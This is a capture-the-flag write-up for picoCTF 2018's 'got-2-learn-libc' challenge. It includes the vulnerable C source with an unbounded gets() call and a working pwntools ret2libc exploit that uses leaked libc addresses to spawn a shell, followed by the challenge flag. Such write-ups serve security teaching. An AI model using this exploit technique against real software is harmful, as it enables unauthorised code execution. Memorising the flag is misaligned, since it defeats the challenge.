# got-2-learn-libc
**Points: 250**

## Binary Exploitation

## Question
>This program gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee on the shell server. Source.

### Hint
>try returning to systems calls to leak information
>don't forget you can always return back to main()
## Solution
Let's check the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
```
The ASLR is activated so we need to leak an address to calculate the offset of the libc.
The binary helps us printing the directions so we don't need to use rops.

First, we need to get the addresses of system, exit and /bin/sh
Secondly we have to calculate the libc offset leaking an address.
Once we have the addresses we can execute a ret2libc standard.

```python
from pwn import *

padding = "A" * 160
# ldd vuln : /lib32/libc.so.6
# readelf -s /lib32/libc.so.6 | grep system
sys_libc = 0x0003a940
# readelf -s /lib32/libc.so.6 | grep exit
exit_libc = 0x0002e7b0
# readelf -s /lib32/libc.so.6 | grep puts
puts_libc = 0x0005f140
# strings -tx /lib32/libc.so.6 | grep /bin/sh
binsh_libc = 0x0015902b

p = process('/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln')
p.recvuntil('puts: ')
vuln_puts = int(p.recvline().strip('\n'),16)

base = vuln_puts - puts_libc

sys = p32(sys_libc + base)
ext = p32(exit_libc + base)
binsh = p32(binsh_libc + base)

log.info("System: " + sys)
log.info("Exit: " + ext)
log.info("/bin/sh: " + binsh)

payload = padding + sys + ext + binsh

p.recv()
p.sendline(payload)
p.sendline('cat /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/flag.txt')
p.interactive()
```

![alt text](https://github.com/manulqwerty/picoCTF-2018-WriteUp/blob/master/Binary%20Exploitation/got-2-learn-libc/images/1.png)

### Flag
`picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}`
